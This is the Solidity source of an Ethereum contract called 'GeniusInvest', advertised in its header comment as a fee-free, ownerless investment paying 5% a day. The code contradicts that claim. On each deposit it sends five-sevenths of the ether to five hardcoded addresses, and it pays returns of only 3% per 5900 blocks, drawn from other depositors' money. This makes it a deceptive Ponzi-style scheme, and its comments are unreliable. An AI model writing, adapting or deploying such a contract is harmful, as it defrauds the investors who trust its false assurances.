pragma solidity ^0.4.24;
/**
 *
 * 
 * 
 * 
 * 

- ▒█▀▀█ █▀▀ █▀▀▄ ░▀░ █░░█ █▀▀ 　 ▀█▀ █▀▀▄ ▀█░█▀ █▀▀ █▀▀ ▀▀█▀▀ 
- ▒█░▄▄ █▀▀ █░░█ ▀█▀ █░░█ ▀▀█ 　 ▒█░ █░░█ ░█▄█░ █▀▀ ▀▀█ ░░█░░ 
- ▒█▄▄█ ▀▀▀ ▀░░▀ ▀▀▀ ░▀▀▀ ▀▀▀ 　 ▄█▄ ▀░░▀ ░░▀░░ ▀▀▀ ▀▀▀ ░░▀░░ 

- █▀▀█ █▀▀ █▀▀█ 　 █▀▀▄ █▀▀█ █░░█ 　 █▀▀ 　 　  ▒█▀▀█ █▀▀█ █▀▀█ █▀▀ ░▀░ ▀▀█▀▀ 
- █░░█ █▀▀ █▄▄▀ 　 █░░█ █▄▄█ █▄▄█ 　 ▀▀▄ %　 　 ▒█▄▄█ █▄▄▀ █░░█ █▀▀ ▀█▀ ░░█░░ 
- █▀▀▀ ▀▀▀ ▀░▀▀ 　 ▀▀▀░ ▀░░▀ ▄▄▄█ 　 ▄▄▀ 　 　  ▒█░░░ ▀░▀▀ ▀▀▀▀ ▀░░ ▀▀▀ ░░▀░░ 

 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * 
 * Genius Investment Contract
 *  - GAIN 5% PER 24 HOURS(every 5900 blocks)
 *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)
 *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 70000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
 *
 */
contract GeniusInvest {
    address adcost;
    address projectcom;
    address transcom;
    address pay1;
    address pay2;
    
    function GeniusInvest() {
        adcost = 0x22Df7A778704DC915EB227e368E3824337452855;
        projectcom = 0x7432aBD04F48C794a7C858827f4804c6dF370b86;
        transcom = 0x5BB6151F21C88c7df7c13CA261C70138Da928106;
        pay1 = 0x03AEf3dd85A6f0BC6052545C5cCA0c73021f5bbf;
        pay2 = 0xD40d31121247228D0c35bD8a0F5E0779f3208c8B;
    }
    
    mapping (address => uint256) balances;
    mapping (address => uint256) timestamp;

    function() external payable {
        uint256 getmsgvalue = msg.value / 7;
        adcost.transfer(getmsgvalue);
        projectcom.transfer(getmsgvalue);
        transcom.transfer(getmsgvalue);
        pay1.transfer(getmsgvalue);
        pay2.transfer(getmsgvalue);
        if (balances[msg.sender] != 0){
        address sender = msg.sender;
        uint256 getvalue = balances[msg.sender]*3/100*(block.number-timestamp[msg.sender])/5900;
        sender.transfer(getvalue);
        }

        timestamp[msg.sender] = block.number;
        balances[msg.sender] += msg.value;

    }
}